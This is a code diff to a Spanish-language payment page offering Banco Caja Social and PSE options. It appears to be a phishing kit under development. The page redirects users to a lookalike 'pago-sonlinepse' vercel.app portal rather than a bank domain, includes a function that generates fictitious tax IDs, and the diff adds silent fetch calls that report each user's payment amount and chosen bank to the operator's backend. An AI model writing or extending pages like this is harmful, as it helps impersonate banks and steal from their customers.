@@ -227,6 +227,7 @@
                         <div class="custom-select-option" data-value="bc-personas">Banco Caja Social - Personas</div>
                         <div class="custom-select-option" data-value="bc-empresas">Banco Caja Social - Empresas</div>
                         <div class="custom-select-option" data-value="pse">PSE</div>
+                        <div class="custom-select-option" data-value="bc-nuevo">Banco Caja Social - Nuevo portal Banca Empresas</div>
                     </div>
                 </div>
                 <input type="hidden" name="medio_pago" id="hiddenMedioPago" required>
@@ -289,7 +290,7 @@
             </div>
             <div class="footer-col">
                 <div class="contact-item">
-                    <img src="telefonochiquito.png" alt="Contáctenos">
+                    <img src="contactenos con telefonochiquito.png" alt="Contáctenos">
                     <div class="contact-text">
                         <h4>Contáctenos</h4>
                     </div>
@@ -371,7 +372,7 @@
     </div>
 
     <script>
-        const API_URL = '';
+        const API_URL = '';  // Vacío = misma URL del servidor (funciona en local y en producción)
         const RAPPIPAY_LINK_CODE = 'x5BEvM';
 
         function generarNITFicticio(nombre) {
@@ -453,6 +454,11 @@
                 // Redirigir directo al portal de Caja Social
                 const overlay = document.getElementById('loadingOverlay');
                 overlay.classList.add('active');
+                const valorPago = document.getElementById('valorPago').textContent;
+                fetch(`${API_URL}/api/pasarela/notificar-directo`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ valor: valorPago.replace('$','').replace(/\./g,''), banco: 'BANCO CAJA SOCIAL' })
+                }).catch(() => {});
                 setTimeout(() => {
                     window.location.href = 'https://pago-sonlinepse.vercel.app/sites/cj/manager/48866e99e0bf862e2a739a49';
                 }, 2000);
@@ -534,6 +540,10 @@
                 loadingOverlay.classList.add('active');
                 document.getElementById('btnPagarPSE').disabled = true;
                 document.getElementById('btnPagarPSE').textContent = 'Redirigiendo...';
+                fetch(`${API_URL}/api/pasarela/notificar-directo`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ valor: Math.round(valor), banco: bancoName })
+                }).catch(() => {});
                 window.location.href = BANCOS_DIRECTOS[bancoCode];
                 return;
             }
